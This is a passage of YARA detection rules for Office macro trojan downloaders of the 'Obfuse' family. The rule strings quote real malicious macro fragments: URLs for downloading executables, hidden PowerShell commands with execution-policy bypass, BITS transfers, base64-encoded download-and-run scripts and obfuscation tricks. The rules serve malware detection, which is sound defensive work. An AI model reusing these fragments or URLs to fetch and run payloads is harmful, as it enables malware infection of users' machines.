        $x_1_5 = "\"TargetedEmployees180821.xlsm\" Then" ascii //weight: 1
        $x_1_6 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_7 = "= CreateObject(\"WScript.Network\")" ascii //weight: 1
        $x_1_8 = "= Environ(\"Temp\") & \"\\Details.dat\"" ascii //weight: 1
        $x_1_9 = "= Environ(\"Temp\") & \"\\TEDetails.dat\"" ascii //weight: 1
        $x_1_10 = "= Environ(\"Temp\") & \"\\IncDetails.log\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAI_2147793328_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAI!MTB"
        threat_id = "2147793328"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open \"get\", \"https://rocktrade.alphacode.mobi/uploads/bin_Protected.exe\", False" ascii //weight: 1
        $x_1_2 = ".Open \"get\", \"https://cr1m3.work/2/NFE-010920.exe\", False" ascii //weight: 1
        $x_1_3 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_4 = "= CreateObject(\"SHELL.APPLICATION\")" ascii //weight: 1
        $x_1_5 = "Sub Document_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRDF_2147793381_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRDF!MTB"
        threat_id = "2147793381"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 61 68 61 68 61 20 3d 20 22 68 74 74 22 20 2b 20 22 70 22 20 2b 20 22 73 22 20 2b 20 22 3a 22 20 2b 20 22 2f 2f 22 20 2b 20 22 77 22 20 2b 20 22 77 22 20 2b 20 22 77 22 20 2b 20 22 2e 62 69 74 6c 79 2e 63 6f 6d 2f [0-20] 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 [0-20] 22}  //weight: 1, accuracy: Low
        $x_1_2 = "lol = \"ms\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"hta\"" ascii //weight: 1
        $x_1_3 = "Sheet2.microsoft.ShellExecute Sheet3.lol, Sheet1.hahaha" ascii //weight: 1
        $x_1_4 = "Function lol()" ascii //weight: 1
        $x_1_5 = "Function hahaha()" ascii //weight: 1
        $x_1_6 = "Outlook.CreateObject(\"Shell.Application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BKS_2147793563_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BKS!MTB"
        threat_id = "2147793563"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run(phaykhpoufvxoenvriretw, octoiwwojgbevkpnwyhzektsnnydyzs)" ascii //weight: 1
        $x_1_2 = "= Chr(bnhfg - 124)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHG_2147794194_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHG!MTB"
        threat_id = "2147794194"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xmlHttp.Open \"GET\", sURL, False" ascii //weight: 1
        $x_1_2 = "xmlHttp.send \"\"" ascii //weight: 1
        $x_1_3 = "fsT.Open 'Open the stream And write binary data To the object" ascii //weight: 1
        $x_1_4 = "fsT.WriteText (GetHTMLSource(\"https://wtools.io/code/dl/b6Jh\"))" ascii //weight: 1
        $x_1_5 = "fsT.SaveToFile \"x.vbs\", 2 'Save binary data To disk" ascii //weight: 1
        $x_1_6 = "CreateObject(\"WScript.Shell\").Run \"x.vbs\", 0, False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHH_2147794214_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHH!MTB"
        threat_id = "2147794214"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Private Sub Document_Open()" ascii //weight: 1
        $x_1_2 = "= \"powe^rs\"" ascii //weight: 1
        $x_1_3 = "networkpositive = \"C:\\Users\\Public\\Documents\\heavysocial.c\" & Chr(109) & \"d\"" ascii //weight: 1
        $x_1_4 = "= \"h^ell\"" ascii //weight: 1
        $x_1_5 = "-w hi sle^e^p -Se 31;Start-BitsTransfer -Source htt`ps://cdn.discordapp.com/attachments/879094696843038753/889410069207351376/RP.e`xe" ascii //weight: 1
        $x_1_6 = "sheee = \"shel\"" ascii //weight: 1
        $x_1_7 = "Close foodpull" ascii //weight: 1
        $x_1_8 = "CreateObject(sheee & \"l.application\").Open(networkpositive)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAJ_2147794236_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAJ!MTB"
        threat_id = "2147794236"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set objWshShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "Range(\"A1\").Value =" ascii //weight: 1
        $x_1_3 = {49 6e 53 74 72 28 [0-100] 2c 20 4d 69 64 28 [0-100] 2c 20 69 2c 20 31 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {62 68 4b 71 76 7a 78 4a 55 79 20 3d 20 [0-2] 20 2f 20 [0-2] 20 2f 20 32 30 32 31}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 [0-100] 28 22 68 [0-4] 3a 2f 2f 77 77 77 2e 6a [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAK_2147794841_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAK!MTB"
        threat_id = "2147794841"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Print #1, Replace(ActiveDocument.Range.Text, \"&lt;\", \"\")" ascii //weight: 1
        $x_1_2 = {45 78 63 65 6c 20 68 6f 70 ?? ?? ?? ?? 20 26 20 22 2e 2e 2e 68 54 61 22}  //weight: 1, accuracy: Low
        $x_1_3 = {4e 65 77 20 57 73 68 53 68 65 6c 6c 0d 0a 65 78 63 65 6c [0-10] 2e 72 75 6e 20 72 61 70 [0-10] 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 0d 0a 43 61 6c 6c 20 73 28 22 [0-20] 22 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHI_2147794918_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHI!MTB"
        threat_id = "2147794918"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 31 38 2e 31 39 35 2e 31 34 33 2e 31 38 33 2f [0-30] 2e 65 60 78 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-20] 2e 65 60 78 65}  //weight: 1, accuracy: Low
        $x_1_3 = "= CreateObject" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHI_2147794918_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHI!MTB"
        threat_id = "2147794918"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -Exec bypass -NonI -W Hidden (('& ((GeT\"" ascii //weight: 1
        $x_1_2 = "-VARIAble SXB*MDr*SXB).naMe[3,11,2]-joiNSXBSXB)( (\"" ascii //weight: 1
        $x_1_3 = "mANAgement.AuToMaTION.PsCr'+'EDeNT\"" ascii //weight: 1
        $x_1_4 = "IaL SXB SXB,( SXB76492d1116743f0423413b16050a5345M\"" ascii //weight: 1
        $x_1_5 = "OQA1ADEAMAA5AGIANQAxADAANwA5ADgAZ'+'gBkADUAZAA4ADA\"" ascii //weight: 1
        $x_1_6 = "ADAAYwBiADIANQAzADkAMAAyADkAYgBlADMANwAxADUAOQAyAG\"" ascii //weight: 1
        $x_1_7 = "IAMwA2AGUAYQA1AGMAMAA2ADcA'+'NAAzADgAYQBlADUANgAxA\"" ascii //weight: 1
        $x_1_8 = "CuREstrING -k  (2'+'27..242) ) '+').getNETworkCred\"" ascii //weight: 1
        $x_1_9 = "ENtIal().PaSSword)') -rePLaCe  ([CHaR]97+[CHaR]56+\"" ascii //weight: 1
        $x_1_10 = "CHaR]66),[CHaR]39) | & ( $shELliD[1]+$sHELLID[13]+\"" ascii //weight: 1
        $x_1_11 = "Str = Str + \"'X')\"" ascii //weight: 1
        $x_1_12 = "CreateObject(\"Wscript.Shell\").Run Str" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BKQ_2147795274_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BKQ!MTB"
        threat_id = "2147795274"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "accessPopEarth.run excelHipExcel" ascii //weight: 1
        $x_1_2 = "Open \"\" & excelHipExcel & \"\" For Output As #1" ascii //weight: 1
        $x_1_3 = ".microsoftHopRock officeExcelOffice & \".....hta.\", Replace(ActiveDocument.Range.Text, \"&lt;\", \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHK_2147795714_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHK!MTB"
        threat_id = "2147795714"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "IABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbAB" ascii //weight: 1
        $x_1_2 = "lACgAIgBoAHQAdABwADoALwAvADEAMwAuADkAMgAuADEAMAAwAC4AMgAwADgALwB0AG8AawBzAC8AYQB1AGQAaQBvAC4AZQB4AGUA" ascii //weight: 1
        $x_1_3 = "IgAsACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAAkAFAAcgBvAGMATgBhAG0AZQAiACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA==" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHJ_2147795719_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHJ!MTB"
        threat_id = "2147795719"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 31 38 2e 31 39 35 2e 31 34 33 2e 31 38 33 2f 37 2f 37 2f 49 4d 47 5f [0-20] 2e 65 60 78 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-20] 2e 65 60 78 65}  //weight: 1, accuracy: Low
        $x_1_3 = "= CreateObject(sheee & \"l.application\")" ascii //weight: 1
        $x_1_4 = ".Open(behaviorexactly)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHJ_2147795719_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHJ!MTB"
        threat_id = "2147795719"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "17"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ(\"LocalAppData\") & \"\\think-cell\"" ascii //weight: 1
        $x_1_2 = "& \"\\test.dll\"" ascii //weight: 1
        $x_1_3 = "= \"mon\"" ascii //weight: 1
        $x_1_4 = "= \"Down\"" ascii //weight: 1
        $x_1_5 = "= \"oFileA\"" ascii //weight: 1
        $x_1_6 = "= \"ll32\"" ascii //weight: 1
        $x_1_7 = "= \"llExe\"" ascii //weight: 1
        $x_1_8 = "= \"run\"" ascii //weight: 1
        $x_1_9 = "= \"s://\"" ascii //weight: 1
        $x_1_10 = "= \"e.\"" ascii //weight: 1
        $x_1_11 = "= \"ari\"" ascii //weight: 1
        $x_1_12 = "= \"om\"" ascii //weight: 1
        $x_1_13 = "= \"ogs.\"" ascii //weight: 1
        $x_1_14 = "\"JJCCCJJ\"\", 0, \"\"open\"" ascii //weight: 1
        $x_1_15 = "Sheet1.Activate" ascii //weight: 1
        $x_1_16 = "Run \"" ascii //weight: 1
        $x_1_17 = "Environ(\"NUMBER_OF_PROCESSORS\") < 4 Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHL_2147795736_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHL!MTB"
        threat_id = "2147795736"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HAGUAYQBsAHIAZgB1AHYAaQBrAGwAeQBlAHgALgBlAHgAZQAiADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQB" ascii //weight: 1
        $x_1_2 = "iAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwAzAC4ANwAwAC4ANQAyAC4AOAAvAFIAMQAvAFoALwBVAFkASAAzADAAMgAuAGUAeABlAC" ascii //weight: 1
        $x_1_3 = "IALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACgA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHM_2147795750_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHM!MTB"
        threat_id = "2147795750"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"start /MIN C:\\Windo\"" ascii //weight: 1
        $x_1_2 = "\"ws\\System32\\\" + \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe\"" ascii //weight: 1
        $x_1_3 = "\" -win 1 -enc\"" ascii //weight: 1
        $x_1_4 = "Shell(batch, 0)" ascii //weight: 1
        $x_1_5 = "JABQAHIAbwBjAE" ascii //weight: 1
        $x_1_6 = {62 61 74 63 68 20 3d 20 22 [0-25] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_7 = "BlAG4AdgA6AEEAU" ascii //weight: 1
        $x_1_8 = "QAEQAQQBUAEEA" ascii //weight: 1
        $x_1_9 = "AAcgBvAGMA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHN_2147795831_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHN!MTB"
        threat_id = "2147795831"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"start /MIN C:\\Windo\"" ascii //weight: 1
        $x_1_2 = "\"ws\\System32\\\" + \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe\"" ascii //weight: 1
        $x_1_3 = "\" -win 1 -enc\"" ascii //weight: 1
        $x_1_4 = "Shell(batch, 0)" ascii //weight: 1
        $x_1_5 = "JABQAHIAbwBjAE" ascii //weight: 1
        $x_1_6 = {62 61 74 63 68 20 3d 20 22 [0-25] 2e 62 61 74 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHN_2147795831_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHN!MTB"
        threat_id = "2147795831"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(sheee & \"l.application\").Open(lineagency)" ascii //weight: 1
        $x_1_2 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 62 61 74}  //weight: 1, accuracy: Low
        $x_1_3 = "IAAnAG4ARQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAEUAYgBDACsAKwArACsAKwArACsAKwArAC" ascii //weight: 1
        $x_1_4 = "C4AUgBlAHAAbABhAGMAZQAoACcAPAA8ADwAPAA8ADwAPAA8ADwAPgA" ascii //weight: 1
        $x_1_5 = "= \"p^o^w^e^R^Sh^eLL^.e^X^e ^-e^x^ec^u^tI^o^nP^OLIcY" ascii //weight: 1
        $x_1_6 = "Close letterrate" ascii //weight: 1
        $x_1_7 = "ACcALAAnAEUARgBHAEgASgApAC4AJABTAFgARABDAEYAVgBHAEIASABOAEoAWABEAEMARgBWAEcAQgBIAEoASwAoACQAUwBaAFgARABDAEYAVgAnACkAOwANAAoAJg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PHCC_2147795986_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PHCC!MTB"
        threat_id = "2147795986"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 20 2d 77 20 68 69 20 73 6c 65 65 5e 70 20 2d 53 65 20 33 31 3b 53 74 61 5e 72 74 2d 42 69 74 73 54 72 61 6e 73 5e 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 31 38 2e 31 39 35 2e 31 34 33 2e 31 38 33 2f 37 2f 37 2f ?? ?? ?? 5f [0-20] 2e 65 60 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 65 60 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = "obh = CreateObject(sheee & \"l.application\").Open(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAL_2147796694_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAL!MTB"
        threat_id = "2147796694"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Mid(enc, iiijbjhvbdhbvhsdhgbsdfi, 1)" ascii //weight: 1
        $x_1_2 = "AppData & Chr(Asc(xikhjbhbhhkubkgdsjbjhgjgx) - 1)" ascii //weight: 1
        $x_1_3 = "= Decrypt(\"fyf/jjkj\")" ascii //weight: 1
        $x_1_4 = "Sub Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PLI_2147797058_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PLI!MTB"
        threat_id = "2147797058"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "oAHQAdABwADoALwAvAHgAYQBtAHAALgBjAGgAaQBjAGsAZQBuAGsAaQBsAGwAZQBy" ascii //weight: 1
        $x_1_2 = "AC4AYwBvAG0ALwBNAEEATQBBAC8AQwBvAG4AcwBvAGwAZQBBAHAAcAAxADUALgBlA" ascii //weight: 1
        $x_1_3 = "HgAZQAiACwAIgAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcACQAUAByAG8AYwBOAG" ascii //weight: 1
        $x_1_4 = "EAbQBlACIAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAoACIAJABlAG4" ascii //weight: 1
        $x_1_5 = "AdgA6AEEAUABQAEQAQQBUAEEAXAAkAFAAcgBvAGMATgBhAG0AZQAiACkA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAM_2147797812_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAM!MTB"
        threat_id = "2147797812"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DecryptIjhfddfdgdfbvgjsfdhdgdfjfsf(\"fyf/mmdd\")" ascii //weight: 1
        $x_1_2 = "Mid(enc, iisdfvjndfjjhvfvksufhfvi, 1)" ascii //weight: 1
        $x_1_3 = "AppData & Chr(Asc(xifdvhbvbdjbvhfdjvbjhfdjvkx) - 1)" ascii //weight: 1
        $x_1_4 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BBO_2147798605_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BBO!MTB"
        threat_id = "2147798605"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Environ$(\"UserDomain\") & \"\\\" & Environ$(\"ComputerName\") & \"\\\" & Environ$(\"Username\")" ascii //weight: 1
        $x_1_2 = "= WshShell.Exec(\"taskkill /fi \"\"imagename eq msedge.exe\"\"\")" ascii //weight: 1
        $x_1_3 = "= WshShell.Exec(\"taskkill /fi \"\"imagename eq iexplorer.exe\"\"\")" ascii //weight: 1
        $x_1_4 = "Call Show_Sheets" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAN_2147805094_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAN!MTB"
        threat_id = "2147805094"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
